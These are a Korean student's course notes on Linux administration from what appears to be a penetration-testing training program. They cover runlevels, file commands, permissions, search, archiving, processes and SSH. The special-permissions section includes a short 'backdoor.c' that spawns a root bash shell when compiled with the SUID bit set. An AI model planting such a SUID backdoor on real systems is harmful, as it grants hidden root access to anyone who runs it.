정보보안(네트워크,서버)엔지니어 양성과정
** 모의해킹 & 침해대응 전문가 과정 **

--------------------------------------------------------------------------------------------------------------------------------------------------------
학원 스텝1(8.21)
	1.시스템 런레벨
		- 시스템 구동 수준
		0 - halt : 서버가 꺼져있는 상태
		1 - single user mode : 운영체제를 최소로 구동시킨 상태
					문제가 생겨서 제어할 때 사용	
		2 - 멀티유저모드 : 다중 사용자가 서비스를 받을수 있는 상태
			nfs서비스 없음, tui(텍스트 기반)
			 -> nfs : 네트워크 상에서 폴더를 공유하고 자원을 나눔
		3 - 멀티유저모드
			nfs서비스 있음 , tui(텍스트 기반)
		4 - 정의 안되어있음 원하는거 사용 가능
		5 - 멀티유저모드
			gui(그래픽 기반)
		6 - reboot

	2.시스템 런레벨 확인
		# who -r

	3.시스템 런레벨 변경
		- 단일레벨 변경 : halt, poweroff, reboot(특정한 런레벨로 보낼때)
		- 다중레벨 변경 : init (0, 1 ...), shutdown (-r / -h ...)

	2.언어 변경
		-현재 언어 확인
			echo $LANG
			locale
		-언어 변경
			(영구)gnome-system-language
			(임시)export LANG=en_US.UTF-8

	3.암호 변경
		passwd
		passwd 사용자이름

		참고 : root패스워드 복구
			root password recovery
			*CD 부팅
			*GRUB menu 사용
			Grub memu -> e -> kernel -> e -> single -> b
			passwd root
			exit

	4.제어문자
		- ctrl + c : 프로그램 실행중에 인터럽트 걸어서 종료
		- ctrl + d : 파일의 끝 / 현재 실행 종료
		- ctrl + u : 현재 커서 한 줄을 지우는 거
		- ctrl + w : 현재 커서 마지막 단어 하나 지우는 거
		- ctrl + s : 화면 멈추기
		- ctrl + q : 화면이 다시 동작
		du : 디렉토리의 모든것의 용량 확인

학원 스텝2(8.22)
	1.man : 매뉴얼
	- man ls
	- man -k calendar : 파일이름 잘 모를때
	- man -f : 동일한 이름을 가진 여러개의 파일이나 명령어 보여준당
	- man  번호 : 섹션 번호로 검색


	2.명령어애 대한 man 페이지 확인
	- (간략하게 정보 확인) # ls --help   (# CMD --help)
	- (자세하게 정보 확인) # man ls      (# man CMD)

	3./SEE ALSO : 더 찾아봐야 할것들
	-man ls | col -b 하면 이상한 문자 안나온다고 한다

	4.man 은 usr/share/man에 있다

	5.원격 접속 명령어 : telnet. ssh

	6.시스템 기본 정보 확인 명령어
		uname -a
		cat /etc/redhat-release
		http://docs.redhat.com
		date CMD
		cat CMD

		[실무]
		rdate -p time.bora.net
		rdate -s time.bora.net (시간 설정하기)

	7.시간 정보 출력 포맷을 변경하기
		# date +%m%d        /* %m : month, %d : day */
		# date +%m%d_%H%M   /* %H : hour, %M : Minute */


	8.오늘 날짜로 된 파일을 만들기
		touch file_`date +%m%d`.log

	9.1일 뒤, 2일 뒤
		# date -d '1 day ago' +%m%d  (# date -d '-1 days' +%m%d)
		# date -d '2 day ago' +%m%d  (# date -d '-2 days' +%m%d)

학원 스텝3(8.23)
	1.디렉토리 이동 관련 명령어
		pwd CMD
			[실무예] PS1 변수
			#export PS1='[\u@\h \w]\$ ' (~/.bashrc) w가 소문자면 전체경로라 pwd안써도된다.

		cd CMD
			경로(PATH)
			* 상대경로(Relative PATH) $ cd dirl
			* 절대경로(Absolute PATH) $ cd /dirl
			# cd 폴더확인
			# cd ~fedora 페도라의 홈 폴더로 이동
			[참고] ~ : 자신의 홈 폴더
			       cd .  : 현재 폴더
			       cd .. : 이전폴더
			[실무] cd - : 이전폴더로 이동
			        cd ../dir1 : 옆에있는 폴더로 이동 
		
	2.디렉토리 관련 명령어
		ls cmd
			# ls -l dir1 지금있는 디렉토리의 내용을 보여줌
			# ls -ld dir1 지금있는 디렉토리의 디렉토리정보를 출력 
			# ls -R dir1 지금있는 디렉토리의 하위 디렉토리도 보여줌
			# ls -al 	.을 포함한 디렉토리 파일을 보여줌 (.은 설정이나 환경파일임)
			# ls -F 파일이 링크인지 카피인지 등을 알려줌 색으로 
			# ls -i 아이노드보여줌
			# ls -h 사람이 읽기 쉬운 크기로 나타내줌
			OPTIONS : -l, -d, -R, -a, -F, -i, -h
			[실무예] 오늘 로그 파일
			# ls -altr

	3.mkdir CMD
		# mkdir -p dir1/dir2 dir2를 만들려면 dir1이 있어야함 

	4.rmdir CMD
		# rm -rf dir1

	5.파일 관리 명령어
		touch CMD
			# touch -t 08301300 file 1 시간을 동기화 시킴 역추적 가능 해커가 수정한시간을 알수있음
		cp CMD
			# cp file1 file2 파일 복사
			# cp file1 dir1 폴더안에 file1이 복사본으로 들어감
			# cp -r dir1 dir2 만약 dir2가없으면 만들어지고 복사됨
			# cp -r file fiel2 하위디렉토리까지 복사
			# cp -i file fiel2 복사여부 물어봄
			# cp -f file fiel2 강제로 복사하기 여부 x
			# cp -p file fiel2 원본 파일의 소유자, 그룹, 권한, 시간 정보를 그대로 보존하여 복사한다
			# cp -a 는 p와 r의 특성을 가짐 폴더는 a를 쓰는게 좋음 
			OPTIONS : -r, -i, -f, -p

			[실무예] 설정 파일 백업하는 경우
			# cd /etc/httpd/conf 
			# cp -p httpd.conf httpd.conf.orig
 			# cp -p httpd.conf.orig httpd.conf
			# cp -a dir1 dir2 (# cp -rp dir1 dir2)

			[실무예] 로그 파일 비우는 경우(EX: file.log)
			# cp /dev/null file.log
			# cat /dev/null > file.log
			# > file.log
			
		mv CMD (파일은 이름바꿀때 파일 디렉토리는 파일을 디렉토리에 넣을때)
			# mv file1 file2
			# mv file1 dir1
			# mv dir1 dir2
			# mv -i dir1 dir2	(복사할것인지 여부를 물어봄)
			# mv -f dir1 dir2	(복사할 파일이 존재할때 삭제하고 복사)
			OPTIONS : -i, -f 
		
				** 와일드 카드 문자 **
				* : 모든것
				? : 한개만
				{} : 선택적인 하나의 문자열
				[] : 선택적인 하나의 문자 

		rm CMD
			# rm -rf dir1 지울때그냥 지움 물어보지 않고 -r은 일반파일 지우고 디렉일경우 하위까지지움
			OPTIONS : -r, -f, -i
			
			[실무예]
			rm 명령어로 지운 파일 복구하는 법
			(TUI) extundelete CMD
			(GUI) TestDisk Tools

	6.파일 내용 확인 명령어
		cat CMD
			# cat file1 file2 > file3 파일 합치기
			# cat -n file1 라인을 보여줌 (# nl file1)
			[참고]strings CMD
			# strings bin/ls 바이너리는 cat으로 열면안됨 strings로 열기

		more CMD
			# CMD | more
			# cat /etc/services | more
			# ps -ef | more
			# rpm -qa | more
			# chkconfig --list | more
			# netstat -an | more
			
		head CMD
			[실무예] 
			# alias pps='ps -ef | head -1 ; ps -ef | grep $1' (~/.bashrc에 저장을 해야 다른 터미널도 사용 가능하고 이건 프로세스 위에 설명과 원하는 인자값 $1에 오는 값을 보기 쉽게 해줌)

		tail CMD		
			# tail -f /var/log/messages f는 로그를 모니터링하는 도구로 크기가 변할때마다 추가된 정보 출력
			[실무예] 서비스 장애시 조치 방법
			[TERM1] # tail -f /var/log/messages 로그 메세지 분석후
			[TERM2] # service named restart 서비스 재부팅 
			
			[실무예] 서버 모니터링 방법
			[TERM1] # tail -f /var/log/messages (# gnome-system-log) 하나에서 켜놓고 
			[TERM2] # top 		         (# gnome-system-monitor) 다른쪽에서 이거쓰면 위에 뜸
			
			[실무예] tail -f 사용법
			# tail -f /var/log/messages
			# tail -f /var/log/messages | grep -i oracle 오라클 로그메세지만 보기
			# tail -f /var/log/messages | egrep -i 'warn|error|crit|alert|emerg' 해당 단어만 골라서 보기

	7.기타 관리용 명령어
		wc CMD (라인수, 워드수, 크기를 나타냄)
			[참고] Data Gathering 데이터 수집
			# cat /etc/passwd | wc -l 사용자 몇명인지 확인
			# rpm -qa | wc -l 패키치 설치 수 
			# ps -ef | grep httpd | wc -l 클라이언트 몇명 붙었는지 확인
			# df -h / | tail -1 | awk '{print $5}'

		su CMD (스위칭 유저 사용자전환 할 때 사용)
			# su user01	이전사용자의 환경변수가 따라간 상태로 환경전환됨
			# su -user01	이전사용자의 환경변수가 user01의 환경변수로 바뀜 새로 로그인한것처럼
			[실무예] Oracle 사용자로 전환하는 경우
			+---------------------+
		 	l		   			  l
			l       Oracle SW     l		oracle  △
			l		   			  l		  		l	(X) # su oracle
			+---------------------+				l	(O) # su - oracle
			l		   			  l				l
			l       Linux OS	  l		root	l	
			l		   			  l		
			+---------------------+
			
			[실무예] su CMD & sudo CMD
			* su (Swtiching User)
			* sudo (Superuser Do) : /etc/sudoers 에 정의해야함 
				관리자의 권한으로 특정 명령어를 수행할수있게함 

		id CMD 실제, 유호 UID 와 GID를 출력
		
		groups CMD 사용자가 속한 그룹 출력
		
		last CMD(/var/log/wtmp에있음) : 로그인 기록을 보여줌
			# last -f /var/log/wtmp.# -f를 써야지 전체를 보여줌 f가 파일을 보여주는것 안쓰면 이번달만 보여줌
		
		lastb CMD  (/var/log/btmp) : 접속 실패 로그를 출력 
		
		lastlog CMD (var/log/lastlog) : 로그파일보여줌
		
		who CMD (var/run/utmp) : 현재들어와있는사람보여줌
		
		w CMD
			# w 이거는 들어온 사용자가 뭘 하고 있는지 알려줌
			# w -f user01 이거는 user01의 w만 보여줌
			
			[실무예] 모니터링 구문
			while true
			do
				echo "-----------`date`--------"
				CMD	(df -h -T 이건 디스크사용량의 변화량, w user01 이건 유저가 쓰는 명령어 확인)
				sleep 2
			done
			[실무예]
			watch CMD 는 cmd를 2초에 한번씩 띄어줌 
			
		exit CMD 서브쉘을 나가거나 그냥 쉘 나가기

학원 스텝4
	1.파일의 종류
		일반 파일(Regular File)
			아이노드와 데이터블록으로 구성 
		
		디렉토리 파일(Directory File)
			디렉토리 파일은 포인터만 존재 . 기존포인터 ..상위포인터 
			
		링크 파일(Link File)
			-하드링크 파일(Hard Link File) = 복사 
				# ln file1 file2
				아이노드 동일 
				ls -li 했을때 링크수가 디렉토리수
				file2를 편집했을때 같음 file1을 삭제해도 2는 사용가능
				
			-심볼릭 링크 파일(Symbolic Link File) = 바로가기
				# ln -s file1 file2
				아이노드 틀림
				ls -li 했을때 앞에 퍼미션이 l로되고 
				file2를 편집하면 1도 바뀜 하지만 1 삭제하면 2사용불가 
			
			차이점
			심볼릭 링크는 c드라이브와 d드라이브를 넘어서 링크 걸수있음 
			심볼릭 링크는 디렉토리에 링크 걸수있음
				
		장치 파일 (Device File) /운영체제의 kernel과 device간에 통신하기위해 만든 디바이스 드라이버를 모아놓은 파일들을 말함
			-캐릭터 장치 파일(Character Device File)
			-블록 장치 파일(Block Device File)

학원 스텝5
	1.파일속성관리
		chown
			# chown -R user01:staff dir1 이건 -R은 하위디렉토리까지 수정함 user01은 루트자리 staff는 그룹자리를 바꾸는 유저를 설정

		chgrp
		
		chmod
			파일의 퍼미션 변경 방법
				- 심볼릭 모드(Symbolic Mode) # chmod u+x file1
				- 옥탈 모드(Octal Mode)	  # chmod 744 file1
	
	2.파일과 디렉토리의 퍼미션 의미
		파일 : r(read), w(write),x(execute)
		디렉토리 : r(ls CMD), w(생성&삭제), x(cd CMD) 디렉토리는 x를 가지고있어야 함
	
	3.퍼미션 적용 순서
		UID -> GID -> other
	
	4.umask CMD : 파일과 디렉토리 생성 시 기본 퍼미션을 조정
		(관리자) /etc/bashrc
		(사용자) $HOME/.bashrc
		umask 002
		umask 022
		umask 027
	
	5.특수퍼미션(SetUID, SetGID, Sticky Bit)
		특수퍼미션 의미		
			SetUID(SUID) - s로 표시되며 다른사용자가 소유자권한으로 실행함 S는 오류표시임
				[참고] bash 쉘에 SetUID 비트 설정 우회방법
					  /bin/bash는 새로 만들어서 들어가봤자 $로 표시됨 따라서 밑에처럼 우회
					# vi backdoor.c 
					----------------------
					#include <stdlib.h>
					#include <sys/types.h>
					#include <unidtd.h>
					
					main()
					{
						setuid(0);
						setgid(0);
						system("/bin/bash");
					}
					----------------------
					# gcc -o backdoor backdoor.c
					# chmod 4755 backdoor
		
			SetGID(SGID) - s로 표시되며 다른사용자가 그룹권한으로 실행함
			Sticky Bit   - t로 표시되며 게시판처럼 사용하고 다른사람이 올린거 삭제는 불가
			
		특수퍼미션 설정방법
			# chmod 4755 file1
			# chmod 2755 file1
			# chmod 6755 file1
			# chmod 1777 dir1
			
		특수퍼미션 관리방법
			# find / -perm -4000 -o -perm -2000  검색하는법
			# find / -perm -4000 -o -perm -2000 > setuid.txt
			# chmod 755 /usr/bin/passwd 관리자만 암호 변경할수있게함 사용자 변경 x
			# find /home -type f -perm -4000 -exec rm -rf {} \; 4000인거 다 지우기임 그리고 제로데이공격 방어함

학원 스텝6
	1.VIM 편집기
		$HOME/.vimrc
		----------------
		set nu
		set ai
		set ts=4
		----------------
		여기서 편집해가지고 저거 쓰면 vi킬때마다 항상 저거 저장됨
		
학원 스텝7
	1.mail/mailx CMD
		# mail -s "ok:linux214" admin@example.com < report.txt
		[참고] MAC주소 바꾸는법
		# cd /etc/sysconfig/network-scripts
		# ls 
		# vi ifcfg-eth0 들어가서 hardaddress를 지우기
		# power off 
		꺼지고나서 centos파일에서 centos.vms 파일이 있음 메모장으로 열기 
		맥어드레스 자리가 3개가 있는데 이걸 3개다 바꾸기 바꾸고 싶은걸로 
		재부팅하고 ifconfig 검색 그리고 /etc/hosts에 아이피랑 이름 추가 
		[참고] ip바꾸는법
		# export LANG=C
		# system-config-network-tui
		들어가서 호스트이름 바꾸고 아이피바꾸기 
		# service network-restart 하기 
		
	2.talk
		[참고] talk-server 패키치 설치해야함
		# rpm -qa | grep talk
		# yum -y install talk-server
		
		[참고] 서비스 on/off 툴 종류
		(GUI) # system-config-services	(#serviceconf)
		(TUI) # ntsysv 					(# setup)
		(CLI) # chkconfig ntalk on|off 
			
	3.wall CMD
		# wall < /etc/MESS/work1.txt
	
학원 스텝8
	1.관리자가 알아두면 유용한 명령어
		cmp/diff CMD 
			# diff file1 file2 
			# diff -r dir1 dir2		 -r는 하위디렉토리까지 비교
			
			[실무예] 설정 파일 비교하는 경우
			# diff httpd.conf httpd.conf.old
			[실무예] 디렉토리 마이그레이션(이관) 작업 (/was1/* -> /was2/*)
			# diff -r /was1 /was2
				
		sort CMD
			# CMD | sort -k 3   3번째 필드기준으로 정렬
			# CMD | sort -k 3 -r  3번재 필드기준으로 역순(r)정렬
			
			[실무예] 디스크 용량 확인
			# df -k 디스크의 사용량 확인
			# du -sk /var 디렉토리 크기보기  s=sum k=KB
			# cd /var; du -sk * | sort -nr | more
			
		file CMD
			# file * 파일의 유형을 알려줌 
			
학원 스텝9
	1.검색 관련 명령어
		grep CMD
			# grep OPTIONS PATTERN file1
			# grep -l root /etc/hosts /etc/passwd /etc/group	 				여러 파일 중 검색 문자열 존재 파일 출력 
			# grep -n root /etc/group							 				-n: number line, 파일에서 root 문자열을 검색하고 라인 번호도 같이 출력 
			# grep -v root /etc/passwd							                -v: inverse, except, 파일에서 검색 문자열을 제외하고 나머지 출력 
			# grep -i root /etc/passwd							 			    -i: ignore case, 파일에서 검색 문자열의 대소문자를 구분하지 않음 
			# grep -w root file1							   				    -w: word
			# grep --color root /etc/passwd
			# cat /var/log/messages | egrep -i '(warn|error|crit|alert|emerg)	이거는 확장된 grep임 이거아니면이거아니면이거 검색할때 사용 가능0
			# fgrep #fgrep '^root' file1						 				고정된 grep 임 특수기호가 있기때문에 사용함
			OPTIONS : -l, -n, -v, -i, -w
			PATTERN : *, ., ^root, root$, [abc], [^abc] <-안에 있으면 abc만 제외하고 들어가는것 
				*       # grep 'ro*t' /etc/passwd			*은 모든것
				.       # grep 'no...y' /etc/passwd			.은 한글자 ex)nobody
				^root   # grep '^root' /etc/passwd			^는 첫글자에 root가 오는거 찾기
				root$   # grep 'root$' /etc/group			$은 마지막에 root오는거 찾기
				[abc]   # grep 'user0[123]' /etc/passwd	    []안에 한글자 검색
			
			[실무예] alias
			# alias grep='grep -i --color' (~/.bashrc)
			[실무예] chklog.sh
			# vi /root/bin/chklog.sh
			------------------------------
			#!/bin/bash
			
			RE=$(date +'%b %d')
			cat $1 | grep "$RE" | egrep -i --color "(warn|error|crit|alert|emerg)"
			------------------------------
			# chmod 700 chklog.sh
			# chklog.sh /var/log/messages
			
		find
			# find / -name core -type [f|d]    				코어라는 이름을 가진 파일이나 디렉터리 검색
			# find / -user user01 -group class1 			소유자가 유저01이고 그룹이 클래스1인거검색
			# find / -mtime [-7|7|+7] 						최근7일동안과 7일전과 7일보다 오래된것을 말함
			# find / -perm [-755|755] 						퍼미션이 최소 -755이거나 755인거 검색  ex) -400이면 r들어간거 다 출력 
			# find / -size [-300M|300M|+300M]				사이즈가 -300M ~ 300M 사이인거 검색 
			# find / -name core -type f -exec rm {} \;		코어라는 이름을 가진 파일을 전부 삭제 \는 여러개의 명령어를 한번에 쓸때 마지막에 사용 
			
			[실무예] 오래된 로그 파일 지우기(30일)
			# find /Log -name "*.log" -type f -mtime +30 exec rm -f {} \;
			[실무예] 갑자기 파일 시스템이 full난경우
			# find /Log -type f -mtime -2 -size +1G							해서 안나오면 1g말고 512mb로
			[참고] lsof(List Open File) 										프로세서가 열고있는 목록들의 파일
			[실무예] 기동 스크립트 실행시 에러메시지 처리 방법
			# find /source -type f -exec grep -l 'Error' {} \; 				에러메시지가있는 소스파일을 검색함
			
학원 스텝10
	압축(Compress)와 아카이빙(Archiving)
		압축 관련 명령어
			gzip CMD
				# gzip file1 				압축
				# gunzip -c file1.gz		풀기전에 보기
				# gunzip file1.gz			해제
			bzip2 CMD	gzip보다 더 효율이 좋음 
				# bzip2 file1				압축
				# bunzip2 -c file1.bz2		풀기전에 보기
				# bunzip2 file1.bz2			해제
			xz CMD
				# yum -y install xz			미리 설치해야함
				# xz file1					압축
				# unxz -c file1.xz			풀기전에보기
				# unxz file1.xz 			해제 
			
		(압축 + 아카이브) 관련 명령어
			tar CMD
				# tar cvf file.tar file1 file2			묶을때
				# tar tvf file.tar 						묶인거볼때
				# tar xvf file.tar 						풀때 
				
				# tar cvzf file.tar.gz file1 file2		묶고 압축까지
				# tar tvzf file.tar.gz 					압축된거 볼때
				# tar xvzf file.tar.gz 					압축풀고 묶은거까지풀기				
				
				# tar cvjf file.tar.bz2 				묶고 압축까지
				# tar tvjf file.tar.bz2 				압축된거 볼때
				# tar xvjf file.tar.bz2 				압축풀고 묶은거까지풀기				
				
				# tar cvJf file.tar.xz					묶고 압축까지
				# tar tvJf file.tar.xz 					압축된거 볼때
				# tar xvJf file.tar.xz 					압축풀고 묶은거까지풀기				
			
			jar CMD 이거는 한번에 압축까지함 밑에정도만 쳐도 
				# jar cvf file.jar						압축 
				# jar tvf file.jar						보기
				# jar xvf file.jar						풀기
			
			zip CMD	이거는 한번에 압축까지함 밑에정도만 쳐도 
				# zip file.zip file1 file2				압축
				# unzip -l file.zip 					목록확인
				# unzip file.zip 						풀기 
			
			[실무예] 인터넷 상에서 받은 파일의 확장자에 따라 압축 해제하기 
			file.tar.gz			: tar xvzf file.tar.gz
			file.tar.bz2		: tar xvjf file.tar.gz
			file.tar.xz			: tar xvJf file.tar.xz
			file.zip			: unzip file.zip
			file.jar			: jar xvf file.jar

학원 스텝11
	리다이렉션(Redirection)
		FD
		--------------------
		0	stdin
		1	stdout
		2	stderr
		--------------------
		
		입력 리다이렉션(Redirection Stdin)
			# wall < /etc/MESS/work.txt									키보드로 입력받을걸 대신해서 파일의 내용을 입력받음 또한 wall은 브로드캐스팅역할을함
			
			
		출력 리다이렉션(Redirection Stdout)
			# ls -l > file.txt 
			
		에러 리다이렉션(Redirection Stderr)
			# ls /var /nodir > file.log 2>&1
			
		[실무예]
		# mail -s "Server Ok" admin@example.com < report.txt			계속 레포드파일이 어드민메일로 들어옴 같은도메인은 mail user01만 써도됨 벗 다른 도메인은 mail post4204@naver.com 이렇게 써야함
		# ./script.sh > script.log 2>&1									스크립트를 이동시키고 오류난거도 같이 들어감 
		# ./configure --prefix=/usr/local/apache2 > apache.log 2>&1		소스파일에대한환경설정파일 을 아파치로그로 넣고 오류난거도 같이 넣음
		$ find / -name core -type f 2>/dev/null							일반사용자가 core라는 이름으로 파일을 찾고 오류난거는 일반사용자가 필요가 없으니깐 버림
		
	파이프(pipe)
		# CMD | more
		# CMD | grep xinetd
		# CMD | CMD | CMD
		
		[참고] CMD | tee file.log
		# while true
		do
			CMD | tee -a file.log										2초마다 cmd의 내용이 보여지고 file.log로 들어감
			sleep 2
		done 
		
		# script  -a /dev/null | tee /dev/pts/1 | tee /dev/pts/2		화면을 공유하는경우 사용함 
		
	쉘 기능(Shell function)
		# set -o 				현재 쉘 자체의 기능 전체목록확인
		# set -o vi				현재 쉘 자체의 기능 중 vi기능 on
		# set +o vi				현재 쉘 자체의 기능 중 vi기능 off
		
		# set -o ignoreeof		CTRL+D 해도 안나가지게 함  
		# set -o noclobber 		>로 덮어쓰는거 방지하게해줌
		
		[참고] <TAB>과 <TAB><TAB> 키의 사용
	
	변수(Variable)
		변수의 종류
			-지역변수(Local Variable)			# VAR=5
			-환경변수(Environment Variable) 	# export VAR=5
			-특수변수(Special Variable)		: $$(현재쉘의pid저장)
											  $!(바로 이전에 백그라운드로 실행한 프로세스 pid)
											  $?(바로 이전 명령어의 정상 실행여부값들어감 0이면 정상)
											  $#(인자의 갯수)
											  $*(인자 전체)
											  $0(프로그램 이름)
											  $1(첫번째 인자)
											  $2(두번째 인자)
			
		변수선언 방법
			# VAR=5							숫자나 문자 특수기호 상관없음 이퀄 양쪽에 공백존재하면 안됨 
			# export VAR 					환경변수 선언법
			# export VAR=5					환경변수와 지역변수 한번에 선언법
			# echo $VAR						변수 확인하는법
			# unset VAR						변수 해제하는법
				export 의미
					시스템/쉘 환경변수(set/env)치면나옴
						- PS1/PS2								ps1은 쉘 프롬프트 형식 바꾸기 2는 끝나지 않았음을 나타낼때
							# export PS1='[\u@\h \w]\$'
						- TREM
							# export TERM=vt100					터미널 정의가 되어있는 변수
						- LANG									언어가 선언되어 있는 변수
							# export LANG=C
							# export LANG=en_US.UTF-8
							# export LANG=ko_KR.UTF-8
						- PATH									명령어들이 위치한 디렉토리를 선언할 때 사용하는 변수
							# export PATH=$PATH:/root/bin 		(~/.bash_profile)
						- HISTTIMEFORMAT
							# export HISTTIMEFORMAT="%F %T    " (/etc/profile 밑에 정의) histtory쳤을때 날짜가 나옴 년부터 초까지
						- HOME									사용자의 홈 디렉토리가 정의되어있는 변수
						- PWD									현재 작업 중인 디렉토리가 정의되어있는 변수
						- LOGNAME/USERNAME/USER					현재 사용자의 로그인할 때의 이름
					
	메타 캐릭터(Shell metacharacter)
		''		쉘이 해석 할 수 없도록 막아 준다.
		""		쉘이 해석 할 수 없도록 막아 준다. 단 인식되는 문자($, ``, \)들도 있다.
		``		쉘이 해석할 때 명령어로 인식한다. 따라서 역 따옴표 안의 내용을 실행한다.
		;		한개의 라인에 여러개 명령어 수행할 때 사용한다.
		\		바로 이후에 있는 문자을 쉘이 해석 할 수 없도록 막아 준다.
	
	히스토리(Command History)
		# histroy
		# histroy -c				히스토리목록삭제
		HISTSIZE=512				히스토리 기록하는 스택의 크기지정 기본 512 레드햇 1000
		HISTFILE=~/.bash_history	히스토리 내용을 지속적으로 저장하는 파일이름 지정
		HISTFILESIZE=512			히스토리 파일의 크기지정
	
	엘리어스(Alias)
		# alias cp='cp -i'			별칭 설정 
		# alias						별칭 확인
		# unalias cp				별칭 해제 
	
	환경파일(Environment Files)
		RedHat의 환경파일목록
			- /etc/profile													관리자의 설정파일, 로그인시 1번 실행
			- $HOME/.bash_profile ($HOME/.bash_login, $HOME/.profile)		사용자의 설정파일, 로그인시 1번 실행
			- $HOME/.bashrc													사용자의 설정파일, 쉘이 실행할때 마다 실행
			
			- $HOME/.bash_logout
			
			사용자 로그인 시
			/etc/profile -> $HOME/.bash_profile -> $HOME/.bashrc 			실행순서
		
		RedHat 계열
			- /etc/profile													관리자의 설정파일, 로그인시 1번 실행
				/etc/profile.d/*.sh
			- $HOME/.bash_profile											사용자의 설정파일, 로그인시 1번 실행
				$HOME/.bashrc
					/etc/bashrc
						/etc/profile.d/*.sh
			- $HOME/.bashrc													사용자의 설정파일, 쉘이 실행할때 마다 실행
				/etc/bashrc
					/etc/profile.d/*.sh
			
학원 스텝12
	프로세스 관리(Process Administration)
		프로세스 정보(/proc/PID)			/proc/pid번호 쓰면 ps에 대한 정보가 여기 담겨있음
			PID,PPID
			[참고] init daemon : 모든 프로세스의 부모 프로세스임(PID=1)
			[참고] daemon
			
		프로세스 관리
			프로세스 실행
				fg) # ls	(# gedit)
					- 실행하면 서브쉘(자식)에서 실행됨
					- 하나씩만 실행되서 gedit했을때 그게 끝나지않으면 다른 명령어 사용 불가
					- 부모프로세스 종료되면 자식프로세스 같이 종료됨 
				bg) # ls &	(# gedit &)
					- 백그라운드 실행 
					- 현재터미널도 사용가능 gedit도 사용이 가능
					- 부모프로세스 종료되도 자식프로세스 종료 x
				[실무예] CMD & 수행하는 경우
				- 오래 걸리는 프로그램(백업 스크립트, 데이터 수집 스크립트)
				- GUI 프로그램 실행시(EX: gedit &)
				
			프로세스 확인(전체 프로세스 목록 확인 하면서 원하는 프로세스 찾기)
				# ps -ef | grep xinetd
				# ps aux | grep xinetd
				[참고] 좀비프로세스(Zombie)
				# ps -elf | awk '$2 == "Z" {print $0}'  2번째 인자가 Z인거 찾아서 출력하기
				# kill -9 PID							좀비프로세스 죽이기 
				
			프로세스 종료
				# kill -15 PID (# kill -TERM PID)		해당 PID 정상종료 (default)
				# kill -9 PID  (# kill -kill PID)		해당 PID 강제종료
				# kill -2 PID  (# kill -INT PID)		키보드 인터럽드 CTRL+C임 프로그램 종료
				# kill -1 PID  (# kill -HUP PID)		프로세스를 재시작 시킨다, 설정을 재설정하고나서 설정재로드를 하기위한 명령어
				
				[참고] killall, pkill		이 둘 뒤에는 PID가 아닌 이름으로 죽임 
				# killall httpd
				# pkill httpd 
	
		잡 관리(Job Administration)
			잡(Job) 실행
				fg) # gedit
				bg) # gedit &
			잡(Job) 확인
				# jobs
				# fg %1				백그라운드->포그라운드
				# bg %1				포그라운드->백그라운드
			잡(Job) 종료
				<CTRL + C>			종료시키기
				<CTRL + Z>			중지시키기 
				# kill %1			킬다음 %잡id번호
				
		프로세스 모니터링
			# top (#gnome-system-monitor)	top은 tui방식 게놈은gui방식
			# top -u oracle					오라클 사용자만 보기 
			* uptime 						맨윗줄 뒤에 로드에버리지 1분단위 5분단위 15분단위 해당 숫자를 코어로나눠서 1이 넘으면 위험
			* ps -ef 						좀비프로세스 찾기 
			* CPU
			* MEM							항상 80퍼위로 넘어가면 위험 20퍼는해싱?캐싱?메모리
			* SWAP
			* Process						cpu사용량별 mem사용량별 p와 m 정렬기준을 나타냄 
			[실무예] 모니터링의 다른 도구들
			# top ((x)# htop) 			 	CPU/MEM I/O, x는 설치안되어있다는뜻
			# iotop -> disk I/O 			dist I/O 확인할때 
			(X) # ntop						network I/O
			
		프로세스 관련 명령어
			lsof CMD
				# lsof /usr/sbin/sshd		ssh이름으로 프로세스에 의해 열려진 파일들에 대한 정보를 볼 수 있다
				# lsof -c sshd				sshd데몬으로 프로세스에 의해 열려진 파일들에 대한 정보를 볼 수 있다
				# lsof -p PID				pid번호의 프로세스에 의해 열려진 파일들에 대한 정보를 볼 수 있다
				# lsof -i					포트 프로세스에 의해 열려진 파일들에 대한 정보를 볼 수 있다
			pmap CMD
				# pmap PID					프로세스가 사용하고 있는 메모리의 주소를 확인 할 수 있다
			pstree CMD
				# pstree					실행중인 프로세스 상태를 트리 구조로 보여주는 명령어
				# pstree -p PID				PID로 검색하기 위한 조건 
				# pstree user01				user01의 트리형식보여줌 
				# pstree -alup 				트리형식인데 pid번호까지 나타내줌 
			nice/renice CMD
				# nice -(-20~19) CMD
				# renice (-20~20) CMD
				[실무예] nice, renice 사용 예
				(백업스크립트/데이트 수집 스크립트)
					(X) # /root/bin/backup.sh & 
					(0) # nice -10 /root/bin/backup.sh &  			수를 늘려 우선순위를 낮춰서 실행하게함 
				(부하량을 주는 프로그램)									- but 데몬은 우선순위를 건들면 안됨 계속 돌아가야 하는 프로그램이여서
					# top 
					# renice 10 PID  (PID : 부하량을 주는 프로그램's PID)	프로그램 점유량이 높은 프로그램을 우선순위를 높여서 나중에 실행하게함

학원 스텝13
	원격접속 & 파일전송
		sCMD(ssh, sftp, scp)
		
			scp CMD										암호화된 통로로 파일 복사 하는것
				# scp file1 192.168.0.249:/tmp			파일1을 249 tmp밑에 복사
				# scp 192.168.0.249:/tmp/file1 /test	파일1을 나의 test밑에 복사
				# scp -r dir1 192.168.0.249:/tmp 		dir1을 249 tmp밑에 복사 
				
			sftp CMD
				# sftp fedora@192.168.0.249:/test/*		249의 폴더밑에있는걸 가져옴
				# sftp fedora@192.168.0.249				접속해서 올리거나 내릴수있음 put하고 파일명쓰면 업로드됨
	
			ssh CMD
			# ssh 192.168.0.249
			# ssh 192.168.0.249 CMD
			
			[실무예] ssh CMD + scp CMD
			# scp /backup/linux2XX.tar.gz 172.16.6.252:/backup 
			# ssh 172.16.6.252 ls /backup 
			
			[실무예] Public Authentication 방식
			# ssh-copy-id -i id_rsa.pub root@192.168.0.249						공개키를 루트한테 넣어줌
			
			# cd ~/.ssh 
			# ls 
			# ssh-keygen -t rsa   (# ssh-keygen -t dsa)							키쌍 만들기 -t는 타입
			# ls 																known_hosts가있을거임 여기에 키들의 정보가잇음
			# cat id_rsa														* private key(복호화) *
			# cat id_rsa.pub													* public key(암호화) *
			# scp id_rsa.pub 172.16.6.252:/root/.ssh/authorized_keys.linux2XX   루트한테 공개키 줌
			# cd ~/.ssh 
			사용법.
			# ssh 172.16.6.252 cat /root/.ssh/authorized_keys 
			# ssh 172.16.6.252 hostname 
			# ssh 172.16.6.252 cat /etc/hosts 
			
			ssh는 루트 비밀번호를 감추기위해 키를 만들고 만들때 비밀번호를 지정하면 해당 비밀번호를 치면 원격접속이 가능한 이점이 있다
			

--------------------------------------------------------------------------------------------------------------이센셜끝

